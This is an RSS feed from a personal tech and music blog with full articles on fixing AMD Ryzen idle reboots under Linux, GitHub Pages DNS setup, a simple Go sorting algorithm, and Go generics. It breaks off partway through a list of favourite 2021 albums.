<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>articles</title>
    <link>https://klingt.net/articles</link>
    <description></description>
    <managingEditor> (Andreas Linz)</managingEditor>
    <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
    <item>
      <title>AMD Ryzen random reboots under Linux when in idle</title>
      <link>https://klingt.net/articles/amd-ryzen-random-reboots-under-linux-when-in-idle.html</link>
      <description>This post describes how to prevent random reboots for AMD Ryzen based Linux systems in idle state that use XMP memory profiles.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="This post describes how to prevent random reboots for AMD Ryzen based Linux systems in idle state that use XMP memory profiles.">
  
  <title>AMD Ryzen random reboots under Linux when in idle</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
    media="screen and (prefers-color-scheme: dark)" />
  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>AMD Ryzen random reboots under Linux when in idle</h1>
<p>At the end of 2019 I decided to replace my, now 10 years old, trusty Intel i7 920 machine.
The main motivation was that the i7 was not powerful enough to drive a bunch of CPU hungry software synth, and I always wanted to have a machine that was able to handle any amount of audio plugins I throw at it.
It was still fast enough for some casual gaming or web browsing so I gave it to a friend who was looking for PC at that time.  Otherwise I would have had to throw it away, which would have made me feel a little guilty.
Anyways, AMD Ryzen was all the buzz at that time so I decided to go for that and ordered all the necessary parts.</p>
<p>Here are the relevant specs for reference:</p>
<ul>
<li>CPU: AMD Ryzen 3700X</li>
<li>Mainboard: ASUS ROG STRIX B450-I GAMING</li>
<li>Memory: 32GB Corsair DDR4 DRAM 3200MHz (part no. <code>CMK32GX4M2B3200C16</code>) <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></li>
<li>OS: Arch Linux kernel 5.14.8-arch1-1</li>
</ul>
<p>Now to the actual topic of this post that is the random reboots that the Ryzen PC showed when running in idle for some time.
I ran a stress test over night and there was no spontaneous reboot so I could rule out a faulty power supply.
Checking <code>journalctl</code> for errors did not reveal anything suspicious <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>, in fact the logs just ended before the reboot without any error message.</p>
<p>There is a <a href="https://wiki.gentoo.org/wiki/Ryzen#Random_reboots_with_mce_events">Ryzen page on Gentoo's wiki</a> that recommends to set two kernel parameters:</p>
<ul>
<li><code>idle=nomwait</code></li>
<li>and <code>processor.max_cstate=5</code></li>
</ul>
<p>The latter one disables certain processor <a href="https://www.thomas-krenn.com/en/wiki/Processor_P-states_and_C-states#C-states">c-states</a> which are basically sleep levels a processor can reach when idling, where C0 is the active state and Cn is the <em>lowest level of activity</em> or <em>power consumption</em>.  Disabling c-states is actually wasting energy and thus not very desirable.  I then set both kernel parameters and tried the latest kernel and the LTS variant, but spontaneous reboots still occured.  For a moment I ran out of ideas and suspected that either my Ryzen CPU was defective.</p>
<p>A couple of weeks passed and after some UEFI update I had to reset BIOS settings to <em>optimized defaults</em>.  With default settings no random reboots happened anymore!  Problem solved?  Not yet.  In default settings memory is not running at full speed and Ryzen CPUs scale quite well with memory bandwidth.  Enabling the <a href="https://www.intel.com/content/www/us/en/gaming/extreme-memory-profile-xmp.html">XMP memory profile</a> is, except the a different boot order, the only thing I change from defaults.  This made me curious and after some googling I stumbled over a <a href="https://linustechtips.com/topic/1298348-ryzen-reboot-at-idle-solved-rma/">linustechtips forum thread</a> where someone suggested to disable memory <em>power down mode</em>.  Because BIOS settings are often undocumented I cannot exactly say what this settings does, except from the obviously disabling some memory power saving feature.  Anyways, this setting was located under <code>AI Tweaker -&gt; Memory Timing Controls</code> which is kind of hidden.</p>
<p>To make a long story short, disabling memory <em>power down mode</em> made the random reboots disappear, even when if the memory XMP profile is activated.</p>
<section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>dmidecode to the rescue, god knows which RAM I had installed: <code>$ sudo dmidecode --type memory | grep -i part</code>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p><code>$ journalctl --priority 0..3 --boot=-1</code>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
    </item>
    <item>
      <title>GitHub Pages DNS Setup</title>
      <link>https://klingt.net/articles/github-pages-dns-setup.html</link>
      <description>In this article I describe the DNS setup for my GitHub Pages website which is served under the www subdomain and the apex or base domain.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="In this article I describe the DNS setup for my GitHub Pages website which is served under the www subdomain and the apex or base domain.">
  
  <title>GitHub Pages DNS Setup</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
    media="screen and (prefers-color-scheme: dark)" />
  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>GitHub Pages DNS Setup</h1>
<p>I chose <a href="https://guides.github.com/features/pages/">GitHub Pages</a> to serve <a href="https://github.com/klingtnet/klingtnet.github.io">this website</a>.  By default a GitHub Pages website is served under <code>&lt;repo&gt;.github.io</code>, which is fine but not what I wanted.  As this is a replacement for my old website I wanted it to be served under my domain <code>klingt.net</code>.</p>
<p>Fortunately, setting up a GitHub pages website is pretty easy.  Just create a repository and set the branch and directory which contains the website files in the repositories Pages settings.  <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
<p><img src="/articles/github-pages-settings-source-dialog.png" alt="GitHub Pages settings source dialog"></p>
<p>Adding a custom domain is also straightforward and <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#supported-custom-domains">GitHub's excellent documentation has you covered</a> as usual.  For my case I wanted to serve this website to be served under the <code>www</code> subdomain, that is <code>www.klingt.net</code>, and the apex or base domain <code>klingt.net</code>.  Configuring an apex domain requires an additional step which is why I decided to write this article.</p>
<p>First things first, let's start with setting up the required DNS records.  For the <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#supported-custom-domains"><code>www</code> subdomain</a> I just needed to add a <code>CNAME</code> record that points <code>www.klingt.net</code> to <code>klingtnet.github.io</code>.  I use <code>dig</code> for debugging or showing DNS records and in the following command you will see how to retrieve a <code>CNAME</code> record for a domain:</p>
<pre><code class="language-sh">$ dig +noall +answer www.klingt.net CNAME
www.klingt.net.         3600    IN      CNAME   klingtnet.github.io.
</code></pre>
<p>If you do not have a shell available, e.g. because you're reading this article from a phone or from a Windows machine &#x1f644;, you can use online tools liks <a href="https://dns-lookup.jvns.ca">https://dns-lookup.jvns.ca</a>.</p>
<p>Setting up the <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#using-an-apex-domain-for-your-github-pages-site">apex domain</a> is a bit more complicated because there are no <code>CNAME</code> records for this type of domain.  Instead, you can just define an <a href="https://support.dnsimple.com/articles/alias-record/"><code>ALIAS</code></a> record that—as the name suggests—alias <code>klingt.net</code> with <code>www.klingt.net</code>.  Let's do a DNS query using <code>dig</code> for the <code>ALIAS</code> record:</p>
<pre><code class="language-sh">$ dig +noall +answer klingt.net ALIAS
klingt.net.             929     IN      A       185.199.109.153
klingt.net.             929     IN      A       185.199.111.153
klingt.net.             929     IN      A       185.199.108.153
klingt.net.             929     IN      A       185.199.110.153
</code></pre>
<p>You might wonder why the <code>ALIAS</code> record is not showing up in the result.  This is perfectly fine because the name server resolves an ALIAS directly into A (IPv4) or AAAA (IPv6) records.</p>
<p>The last thing you need to do is to set the default domain under which your domain should be served, again in the Pages settings dialog of the GitHub repository:</p>
<p><img src="/articles/github-pages-settings-domain-dialog.png" alt="GitHub Pages settings domain dialog"></p>
<p>Doing this will create a <a href="https://github.com/klingtnet/klingtnet.github.io/blob/4bd965fa2772ccfc3c69bc5d22ed76d2b9fc65f0/static/CNAME"><code>CNAME</code> file</a> in the source branch that you've initially configured.  Make sure to pull the commit that created this file or manually add it to your website contents.</p>
<p>Et Voilà!  Your website should now be served under your custom domain with a valid HTTPS certificate.</p>
<section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>Configuring the source branch and directory is something I always forget to do and then I'm wondering why my website does not show up &#x1f605;&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
    </item>
    <item>
      <title>The simplest sorting algorithm</title>
      <link>https://klingt.net/articles/the-simplest-sorting-algorithm.html</link>
      <description></description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  
  <title>The simplest sorting algorithm</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
    media="screen and (prefers-color-scheme: dark)" />
  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>The simplest sorting algorithm</h1>
<p>Not all of us have enjoyed a formal computer science education so let's define what a sorting algorithm actually does:</p>
<blockquote>
<p>A sorting algorithm takes an array and puts it elements in a certain order. What order means depends on the values stored in the array, e.g. in numerical order for numbers or lexicographic order for strings. <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
</blockquote>
<p>Let's see an example, for an array <code>a = [4,2,3,1]</code>, a sorting algorithm applied to <code>a</code> will result in <code>[1,2,3,4]</code> when numerically sorted in ascending order.</p>
<p>Ok, now that we've defined what sorting means let's head over to why I am writing this article.  I discovered a paper called <em>Is this the simplest (and most surprising) sorting algorithm ever?</em> on <a href="https://lobste.rs/s/gh1ngc/is_this_simplest_most_surprising_sorting">lobste.rs</a> today.  Sorting algorithms are often used in basic computer science lectures to teach algorithms. The first algorithm students encounter is very often <a href="https://en.wikipedia.org/wiki/Bubble_sort">Bubble sort</a>.</p>
<p>Bubble sort is by no means a complicated algorithm as you can see in the prototypical Go implementation below:</p>
<pre><code class="language-go">xs := []int{4, 2, 6, 10, 3, -1}

for {
    swapped := false
    for i := 1; i &lt; len(xs); i++ {
        if xs[i-1] &gt; xs[i] {
            xs[i-1], xs[i] = xs[i], xs[i-1]
            swapped = true
        }
    }
    if !swapped {
        break
    }
}
fmt.Println(xs) // prints [-1 2 3 4 6 10]
</code></pre>
<p>You can play with the implementation in the <a href="https://play.golang.org/p/wlTPJe7B5Ij">Go playground</a>.  It just iterates over the array until there is no element to swap anymore.  The only complicated thing is to keep around the state if two elements got swapped.</p>
<p>To my surprise the <a href="https://arxiv.org/pdf/2110.01111.pdf">paper</a> mentioned above is describing an even more straightforward way to sort an array:</p>
<pre><code class="language-go">xs := []int{4, 2, 6, 10, 3, -1}
for i := 0; i &lt; len(xs); i++ {
  for j := 0; j &lt; len(xs); j++ {
    if xs[i] &lt; xs[j] {
      xs[i], xs[j] = xs[j], xs[i]
    }
  }
}
fmt.Println(xs) // prints [-1 2 3 4 6 10]
</code></pre>
<p>It does not get much simpler than this <del>and I assume that this might be the first algorithm future computer science students will encounter in their basic lessons.</del>  For me this algorithm is easier to remember than the classic bubble sort but the paper states that it is not a good candidate for an algorithm introduction.</p>
<blockquote>
<p>You certainly do not want to use it as a first example to introduce
students to sorting algorithms. It is not stable, does not work well for
external sorting, cannot sort inputs arriving online, and does not benefit
from partially sorted inputs.</p>
</blockquote>
<p>You can try this one out in the <a href="https://play.golang.org/p/jml6LqHApAN">Go playground</a> as well.</p>
<section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>Take this definition with a grain of salt, I wrote this off the top of my head.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
    </item>
    <item>
      <title>Go Generics - A Quick Overview</title>
      <link>https://klingt.net/articles/go-generics-a-quick-overview.html</link>
      <description>In this blog post I will give a quick overview of Go Generics, i.e. what they are, how and when to use them.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="In this blog post I will give a quick overview of Go Generics, i.e. what they are, how and when to use them.">
  
  <title>Go Generics - A Quick Overview</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
    media="screen and (prefers-color-scheme: dark)" />
  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>Go Generics - A Quick Overview</h1>
<p>A large part of this article is based on Ian Lance Taylor's great <a href="https://www.youtube.com/watch?v=nr8EpUO9jhw">Using Generics in Go</a> talk that was presented at <a href="https://opensourcelive.withgoogle.com/events/go-day-2021">Go Day 2021</a>.</p>
<p>The generics topic polarized the Go community and still does, even though not as much as it did initially.
In the meantime the acceptance for adding generics to the language has increased a lot and only a a small—but not negligible—part of the Go community is rejecting the idea.
Rarely in the last five years of Go programming has there been a situation where generics were either required or where they would have dramatically improved the readability or maintainability of my code.
Of course, there are certain things that are much easier to implement in a reusable fashion with generics.
For me this has been writing custom data structures, mostly sets and once or twice a tree, and also for utility and library code that worked with numeric types or on string and byte slices.</p>
<p>Overall, I think they will be a great addition to the language and will enable the community to provide a series of powerful, new libraries.
If you want to take a deep dive into the topic then take a look at <a href="https://golang.org/s/generics-proposal">type parameters proposal</a> which explains how generics will look like in Go 1.18, planned to be released in February 2022.</p>
<p>Now that we've talked about generics, what are they actually?</p>
<blockquote>
<p>Generics let you write data-structures and functions with types specified later.</p>
</blockquote>
<p>Note that this feature is sometimes referred to as <a href="https://en.wikipedia.org/wiki/Parametric_polymorphism">parametric polymorphism</a>.
Functions and types in Go 1.18+ may receive so called <em>type parameters</em> which help to <em>generalize</em> them over a set of applicable types, hence the name generics.
This might sound confusing at first but I think the following example will clarify the concept.</p>
<pre><code class="language-go">func min[T constraints.Ordered](a, b T) T {
	if a &lt; b {
		return a
	} else {
		return b
	}
}

// min(12,3) will return 3
</code></pre>
<p>You can try out the above example using <a href="https://pkg.go.dev/golang.org/dl/gotip"><code>gotip</code></a>.<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>
What makes this function different from a regular Go function is the <em>type parameter list</em> <code>[T constraints.Ordered]</code>.
It looks like a normal function parameter list, but is instead enclosed in square brackets.
Each type parameter has a constraint that limits the set of actual types it can be instantiated with.
The <a href="https://github.com/golang/go/blob/17980dff368256a0763cf042376d3fb36d06c109/src/constraints/constraints.go"><code>constraints</code> package</a> that ships with Go 1.18 will provide a set common constraints, but new ones can be defined as well (refer to the proposal if you want to know how to define them).
There is also the special <code>any</code> constraint that allows all types without restriction.</p>
<p>Type parameters are not limited to functions, they can also be applied to types.
Below you will see the implementation of a simple stack with type parameters.
A stack is a primitive first-in first-out (FIFO) data structure.</p>
<pre><code class="language-go">type Stack[T any] struct {
    elements []T
}

func NewStack[T any]() *Stack[T] {
	return &amp;Stack[T]{elements: []T{}}
}

func (s *Stack[T]) Push(val T) {
    s.elements = append(s.elements, val)
}

func (s *Stack[T]) Pop() T {
    val := s.elements[len(s.elements)-1]
    s.elements = s.elements[:len(s.elements)-1]
    return val
}
</code></pre>
<p>Following is short example that demonstrates how the stack works and how to call a function with type parameters but no arguments.</p>
<pre><code class="language-go">s := NewStack[int]()
s.Push(10)
s.Push(20)
fmt.Println(s.Pop(), s) // 20 &amp;{[10]}
fmt.Println(s.Pop(), s) // 10 &amp;{[]}
</code></pre>
<p>Type parameters lists are not limited to a single parameter of course, e.g. <code>func F[A any, B constraints.Integer](a A, b B) {}</code> is perfectly valid.</p>
<h2>When to use Generics?</h2>
<p>Ian Lance Taylor's <a href="https://www.youtube.com/watch?v=nr8EpUO9jhw">talk</a> also gave some guidelines on <em>when</em> to use generics.</p>
<blockquote>
<p>Start with writing plain functions, type parameters can easily be added later.</p>
</blockquote>
<p>Another important question that was addressed in the talk is <em>When are type parameters useful?</em></p>
<blockquote>
<ul>
<li>[For] Functions that work on slices, maps and channels of any element type.</li>
<li>For general purpose data structures.</li>
</ul>
</blockquote>
<p>The next guideline is particularly interesting because it might prevent a design failure that could lead to an cumbersome to use API:</p>
<blockquote>
<p>When operating on type parameters, prefer functions over methods!</p>
</blockquote>
<p>Let's say your type constraint requires a method like <code>isEqual(t T) bool</code> to be defined on any applicable type.
This means that any type <code>T</code> would need to implement this method.
As you can imagine this will get inconvenient pretty fast, especially for types not defined in your package.
To illustrate this approach a function will be implemented that only adds a value to a slice if it is not already contained, just like <code>add</code> to a set works.
Any value <code>T</code> must be equatable, i.e. it must implement a <code>isEqual(T) bool</code> method.</p>
<pre><code class="language-go">func AppendIfNew[T interface{ isEqual(T) bool}](s []T, val T) []T {
    for _, x := range s {
        if x.isEqual(val) {
            return s // unchanged
        }
    }
    return append(s, val)
}

type myInt int

func (m myInt) isEqual(x myInt) bool {
	return m == x
}

// AppendIfNewBad([]myInt{1,2,3,4},5)
// will return []myInt{1,2,3,4,5}
</code></pre>
<p>Of course we could not just use an <code>[]int</code> with <code>AppendIfNewBad</code> because <code>int</code> does not implement our custom &quot;equatable&quot; interface.
So we needed to implement a custom <code>int</code> type that satisfies the interface.
Luckily there's a better way.
Instead of requiring a method on <code>T</code> let <code>AppendIfNew</code> accept a function that checks for equality.</p>
<pre><code class="language-go">func AppendIfNew[T any](s []T, val T, isEqual func(T,T) bool) []T {
    for _, x := range s {
        if isEqual(x, val) {
            return s // unchanged
        }
    }
    return append(s, val)
}

// AppendIfNew[int]([]int{1,2,3,4}, 5, func(a, b int) bool { return a == b })
// will return []int{1,2,3,4,5}
</code></pre>
<p>With the words of Ian Lance Taylor:</p>
<blockquote>
<p>It's much simpler to turn a method into a function than it is to add a method to a type!</p>
</blockquote>
<h2>When not to use generics?</h2>
<p>Generics are no panacea, so it is important to consider when <em>not to use them</em>.</p>
<blockquote>
<p>Do not use generics when you are just calling a method on the type argument.</p>
</blockquote>
<pre><code class="language-go">func Copy[R io.Reader, W io.Writer](r R, w W) (int64, error) {
    return io.Copy(w, r)
}
</code></pre>
<p>The type parameters above are redundant and can be replaced by just accepting an <code>io.Reader</code> and <code>io.Writer</code> as shown below:</p>
<pre><code class="language-go">func Copy(r io.Reader, w io.Writer) (int64, error) {
    return io.Copy(w, r)
}
</code></pre>
<p>Two additional rules given in the talk will mark the end of the article.  I hope you learned something!</p>
<blockquote>
<ul>
<li>Do not use generics when the implementation of a common method is different for each type.</li>
<li>Do not use type parameters prematurely; wait until you're about to write boilerplate code.</li>
</ul>
</blockquote>
<p><a href="http://wiki.c2.com/?PrematureOptimization">Premature optimization is the root of all evil</a>.</p>
<section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>it won't compile in the <a href="https://go2goplay.golang.org/">go2go</a> because it is not compatible with the accepted generics proposal.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
    </item>
    <item>
      <title>(Almost) 30 Best Albums of 2021</title>
      <link>https://klingt.net/articles/almost-30-best-albums-of-2021.html</link>
      <description>A list of my favorite albums that were (mostly) released in 2021.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="A list of my favorite albums that were (mostly) released in 2021.">
  
  <title>(Almost) 30 Best Albums of 2021</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
    media="screen and (prefers-color-scheme: dark)" />
  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>(Almost 30) Best Albums of 2021</h1>
<p>Without further ado I admit being a music junkie.  I love discovering new music in my journey through online record stores or whenever I am in one of the local record shops.  One of the positive side effects of Covid was that people had more time listening to music and started buying records.  Vinyl sales were already on the rise over the past years, but the last two years has given them an extra boost that lead to new record stores popping up in Leipzig and elsewhere.</p>
<p>Stop buying crap, support your favorite artists instead!</p>
<h2>Roy Montgomery — 40th Anniversary 2021 LP Series</h2>
<p><img src="https://f4.bcbits.com/img/a1654242133_16.jpg" alt="Album Art of Roy Montgomery - 40th Anniversary 2021 LP Series"></p>
<p>Roy Montgomery.  <a href="https://grouper.bandcamp.com/">Grouper</a>'s 2009 <a href="https://www.discogs.com/master/214067-Roy-Montgomery-Grouper-Roy-Montgomery-Grouper">split EP</a> introduced me to the music of the New Zealand based guitarist and it also spawned my love for drone and ambient music.  I cannot exactly say what makes me love his music so much, but somehow the layered guitar tunes together with the ethereal reverb in the background create an atmosphere that makes me comfy, and which reminds of warm and sunny summer days that I spent in the country side (or that I just imagined while daydreaming).  For me it's just the perfect music to relax and drift away with my thoughts.</p>
<p>When <a href="https://www.grapefruitrecordclub.com/">Grapefruit Record Club</a> announced the 40th anniversary LP series I haven't given it a second thought and pre-ordered the vinyls the same day, planning to make myself a little christmas present.  But, shipping was delayed to January 2022 because of an unprecedented backup at pressing plants (<a href="https://www.vox.com/the-goods/2021/11/22/22797290/adele-vinyl-record-supply-chain-delays">damn you Adele!</a>).</p>
<p>Roy Montgometen to them, <a href="https://www.youtube.com/watch?v=MpwKdaPCcII&amp;t=592s">Too Hot to Dry</a> and <a href="https://www.youtube.com/watch?v=MpwKdaPCcII&amp;t=1714s">High Tension House</a>.  His music is melancholic while being still positive, hard to describe.  This tension might be the reason I'm so fascinated by it.</p>
<p>In an interview, I read about him, he said that he is a self-taught guitarist. This gives me hope that I can sometimes create similar atmospheres on my guitar.  One of my new year's resolutions is to finally take guitar lessons, no excuses anymore.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=2966139599/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://grapefruit1.bandcamp.com/album/roy-montgomery-40th-anniversary-2021-lp-series">Roy Montgomery 40th Anniversary 2021 LP Series by Roy Montgomery</a></iframe>
<h2>Skee Mask — Pool</h2>
<p><img src="https://f4.bcbits.com/img/a2320122722_16.jpg" alt="Album Art of Skee Mask - Pool"></p>
<p>Another good year for Ilian Tape, a <a href="https://taz.de/Muenchner-Technolabel-Ilian-Tape/!5654614/">munich based techno label managed by the Zenker brothers</a> who are best known for their minimal techno releases.  This is not the first album of Skee Mask but a massive one, with more than one hundred minutes of listening time.  There are no fillers on this record, every track is worth a listen.  I would describe the album as a mixture of low-speed drum and bass, breakbeat and deep techno (it's okay to disagree with that, genre borders are fluid).  Not a record to listen on your kitchen radio though, this needs some headphones or speakers capable of producing a massive amount of low end.  Highly recommended record and maybe a future classic.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=222624053/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://iliantape.bandcamp.com/album/itlp09-pool">ITLP09 - Pool by Skee Mask</a></iframe>
<h2>Woulg - Bubblegum</h2>
<p><img src="https://f4.bcbits.com/img/a3596139616_16.jpg" alt="Album Art of Woulg - Bubblegum"></p>
<p>An album for the open minded electronic music lovers.  A potpourri of glitched, broken up and detuned samples sprinkled on top of blazing fast, metallic breaks with deep and earth shattering bass drums every once in a while.  Woulg is not only a talented IDM or breakcore producer, he also shows some of his producing techniques on <a href="https://www.youtube.com/user/woulg">YouTube</a>.  He released his first record on the infamous <a href="https://www.discogs.com/label/55101-illphabetik?page=2">illphabetik</a> breakcore netlabel, home of <a href="https://archive.org/details/ill030">Lisbent</a>.</p>
<p>The album cover should leave no doubt that this is nothing for the faint-hearted.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=4125215390/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://woulg.bandcamp.com/album/bubblegum">Bubblegum by woulg</a></iframe>
<h2>Dean McPhee - Witch's Ladder</h2>
<p><img src="https://f4.bcbits.com/img/a0181296910_16.jpg" alt="Album Art of Dean McPhee - Witch's Ladder"></p>
